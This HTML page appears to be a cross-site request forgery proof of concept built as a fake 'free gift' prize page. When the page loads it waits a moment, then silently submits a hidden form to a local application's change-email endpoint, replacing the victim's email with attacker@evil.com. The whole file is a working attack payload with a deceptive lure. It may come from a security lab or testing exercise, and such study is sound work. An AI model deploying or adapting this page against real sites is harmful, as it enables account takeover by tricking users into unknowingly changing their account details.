<!doctype html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Free Gift</title>
  <style>
    :root { color-scheme: light; font-family: Arial, sans-serif; color: #1f2933; background: #f4f6f8; }
    * { box-sizing: border-box; }
    body { margin: 0; min-height: 100vh; display: grid; place-items: center; padding: 24px; }
    main { width: min(100%, 420px); padding: 32px; background: #fff; border: 1px solid #d9e0e6; border-radius: 8px; box-shadow: 0 8px 24px rgba(31, 41, 51, .06); text-align: center; }
    .eyebrow { margin: 0 0 8px; color: #b42318; font-size: 12px; font-weight: 700; letter-spacing: .08em; text-transform: uppercase; }
    h1 { margin: 0 0 12px; font-size: 24px; line-height: 1.2; }
    p { margin: 0; color: #52606d; font-size: 14px; }
  </style>
</head>
<body onload="setTimeout(function () { document.forms[0].submit(); }, 1500)">
  <main>
    <p class="eyebrow">Special offer</p>
    <h1>You won a free gift!</h1>
    <p>Preparing your claim...</p>
    <!-- Auto-submitting form targeting the secure app -->
    <form action="http://localhost:4001/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com">
    </form>
  </main>
</body>
</html>
